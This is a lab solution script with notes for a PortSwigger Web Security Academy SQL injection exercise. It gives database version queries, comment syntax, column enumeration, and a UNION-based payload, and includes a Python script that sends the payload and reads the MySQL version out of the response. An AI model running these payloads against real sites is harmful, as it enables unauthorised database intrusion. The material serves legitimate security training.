'''
Notes: 

Link: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

1. Vulnerability:  Product Category FIlter (SQLi)

2. Goal: Display database version


Database version

You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

Oracle 	SELECT banner FROM v$version
SELECT version FROM v$instance

Microsoft 	SELECT @@version

PostgreSQL 	SELECT version()

MySQL 	SELECT @@version 


Comments

You can use comments to truncate a query and remove the portion of the original query that follows your input.
Oracle 	--comment
Microsoft 	--comment
            /*comment*/
PostgreSQL 	--comment
            /*comment*/
MySQL 	    #comment
            -- comment [Note the space after the double dash]
            /*comment*/



3 Analysis: 
    * Determine the number of columns (' ORDER BY 1--) #erroor, Doesn't like the -- character, hence as comment (' ORDER BY 1#) // May be Mysql Database
        2 Columns are there! (Internal Error when ' order by 3#)  
    * Determine type Data Type of Columns (' UNION SELECT 'a', 'a'#)

4. Exploit: ' UNION SELECT @@version, NULL#
            ' UNION SELECT @@version, NULL%23



Code reference: https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/sql-injection/lab-08/sqli-lab-08.py

'''


import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url, payload):
    path = "/filter?category=Gifts"
    try:
        r = requests.get(url + path + payload, verify=False, proxies=proxies)
    except:
        r = requests.get(url + path + payload, verify=False)
    
    res = r.text
    soup = BeautifulSoup(res,'html.parser')
    version = soup.find(string=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
    if version is not None: 
        print("[+] The MySQL database version is: " + version)
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        
        # Optional filling Manually
        url = 'https://0a2c008303acd41180496274005b0074.web-security-academy.net'
        #payload = "' UNION SELECT @@version, NULL#" #Will not work, Because we are using Python "#"
        payload = "' UNION SELECT @@version, NULL%23" #Will work, After we url encode "#" -> "%23" 

    if exploit_sqli(url, payload):
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection unsuccessful!")